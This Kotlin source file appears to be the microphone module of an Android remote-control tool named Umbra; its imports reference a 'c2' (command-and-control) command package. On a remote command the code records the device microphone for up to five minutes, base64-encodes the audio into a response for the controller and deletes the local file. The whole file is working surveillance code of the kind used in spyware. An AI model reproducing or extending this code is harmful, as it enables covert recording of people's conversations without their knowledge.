package org.umbra.core.modules

import android.content.Context
import android.media.MediaRecorder
import android.os.SystemClock
import android.util.Base64
import org.umbra.core.c2.Command
import org.umbra.core.core.UmbraResponse
import java.io.File
import kotlinx.coroutines.*

object MicModule {

    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var isRecording = false
    private var recordStartTime = 0L
    private var recordDuration = 0L

    suspend fun record(context: Context, cmd: Command): UmbraResponse {
        if (isRecording) {
            return UmbraResponse.ErrorResponse("mic:already_recording", "mic")
        }

        val durationSec = (cmd.params["duration"]?.toIntOrNull() ?: 30).coerceIn(5, 300)

        return try {
            // Use MPEG_4 container with AAC encoder — more compatible than AAC_ADTS
            // on Samsung devices. Produces .m4a files playable in all browsers.
            val file = File(context.cacheDir, "umbra_mic_${System.currentTimeMillis()}.m4a")
            recordingFile = file

            val rec = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            recorder = rec
            isRecording = true
            recordStartTime = SystemClock.elapsedRealtime()

            // Wait for the recording duration to complete
            delay(durationSec * 1000L)

            // Stop recording and return the result
            stopInternal()
        } catch (e: SecurityException) {
            cleanup()
            UmbraResponse.ErrorResponse("mic:permission_denied:${e.message}", "mic")
        } catch (e: Exception) {
            cleanup()
            UmbraResponse.ErrorResponse("mic:${e.message}", "mic")
        }
    }

    suspend fun stop(context: Context, cmd: Command): UmbraResponse {
        if (!isRecording) {
            return UmbraResponse.ErrorResponse("mic:not_recording", "mic")
        }
        return stopInternal()
    }

    private suspend fun stopInternal(): UmbraResponse {
        return try {
            val rec = recorder
            val file = recordingFile

            // Calculate actual elapsed time BEFORE stopping
            if (recordStartTime > 0) {
                recordDuration = (SystemClock.elapsedRealtime() - recordStartTime) / 1000
                recordStartTime = 0
            }

            if (rec != null) {
                try { rec.stop() } catch (_: Exception) {}
                try { rec.release() } catch (_: Exception) {}
                recorder = null
            }

            isRecording = false

            if (file != null && file.exists() && file.length() > 0) {
                val bytes = file.readBytes()
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                file.delete()
                recordingFile = null

                val dur = if (recordDuration > 0) recordDuration.toInt() else 0
                recordDuration = 0

                UmbraResponse.MicRecordingResponse(
                    audio_base64 = b64,
                    duration_seconds = dur,
                    format = "M4A",
                    size_bytes = bytes.size.toLong()
                )
            } else {
                UmbraResponse.ErrorResponse("mic:empty_recording", "mic")
            }
        } catch (e: Exception) {
            cleanup()
            UmbraResponse.ErrorResponse("mic:stop_failed:${e.message}", "mic")
        }
    }

    private fun cleanup() {
        try { recorder?.stop() } catch (_: Exception) {}
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null
        isRecording = false
        recordStartTime = 0
        recordDuration = 0
        recordingFile?.delete()
        recordingFile = null
    }
}
